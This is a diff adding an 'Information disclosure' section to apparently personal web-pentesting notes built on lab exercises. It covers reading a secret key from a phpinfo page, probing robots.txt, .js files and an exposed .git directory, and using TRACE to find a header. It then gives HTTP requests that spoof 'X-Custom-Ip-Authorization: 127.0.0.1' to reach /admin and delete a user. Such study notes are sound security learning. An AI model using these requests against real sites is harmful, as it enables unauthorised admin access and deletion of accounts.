@@ -107,6 +107,37 @@ nc head / http/1.0
 telnet
 waplayzer
 ```
+## Information disclosure
+
+GET /product?productId=aaa
+We find the debug page in “/cgi-bin/phpinfo.php”:
+
+![image](https://github.com/user-attachments/assets/7028eb48-100c-4f87-a0d6-1efeb49c46a5)
+
+We can find the secret key ("8f4xrr692ckcxycofkaupwwu37cse6io") in the “Environment” section:
+![image](https://github.com/user-attachments/assets/17a0365b-bd9f-40f5-9658-c7552440bdd4)
+There is a /robots.txt file:
+forcefully generating an error messages 
+check .js file for disclosure credentials
+The directory .git/ exists and allows directory listing:
+
+After logging in, send a request with the TRACE HTTP method, which reveals the header “X-Custom-IP-Authorization”:
+![image](https://github.com/user-attachments/assets/a2d7fc98-b0a8-4520-aba9-48f6645213ef)
+It is possible to access /admin with:
+```
+GET /admin HTTP/2
+...
+X-Custom-Ip-Authorization: 127.0.0.1
+```
+![image](https://github.com/user-attachments/assets/6adc9f6e-9d48-4529-9d5b-5e2138f31296)
+And then delete the user with:
+```
+GET /admin/delete?username=carlos HTTP/2
+...
+X-Custom-Ip-Authorization: 127.0.0.1
+```
+![image](https://github.com/user-attachments/assets/409feb4b-ed8d-45dd-9348-625d13a5cc0d)
+
 ---
 ## API Key and Token Leaks
 
